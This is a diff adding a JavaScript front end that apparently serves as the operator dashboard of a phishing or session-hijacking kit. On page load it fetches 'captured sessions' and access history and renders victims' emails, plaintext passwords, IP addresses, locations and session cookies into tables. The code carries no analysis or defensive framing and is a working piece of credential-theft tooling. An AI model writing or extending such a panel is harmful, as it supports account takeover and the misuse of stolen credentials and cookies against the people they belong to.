@@ -1,0 +1,36 @@
+// Fetch Captured Sessions
+async function fetchCapturedSessions() {
+    const response = await fetch('/captured-sessions');
+    const data = await response.json();
+    const tableBody = document.querySelector('#captured-sessions tbody');
+    tableBody.innerHTML = data.map(session => `
+        <tr>
+            <td>${session.email}</td>
+            <td>${session.password}</td>
+            <td>${session.ip}</td>
+            <td>${session.location}</td>
+            <td>${session.cookies}</td>
+            <td>${session.timestamp}</td>
+        </tr>
+    `).join('');
+}
+
+// Fetch Access History
+async function fetchAccessHistory() {
+    const response = await fetch('/access-history');
+    const data = await response.json();
+    const tableBody = document.querySelector('#access-history tbody');
+    tableBody.innerHTML = data.map(history => `
+        <tr>
+            <td>${history.ip}</td>
+            <td>${history.location}</td>
+            <td>${history.timestamp}</td>
+        </tr>
+    `).join('');
+}
+
+// Call functions on page load
+document.addEventListener('DOMContentLoaded', () => {
+    fetchCapturedSessions();
+    fetchAccessHistory();
+});
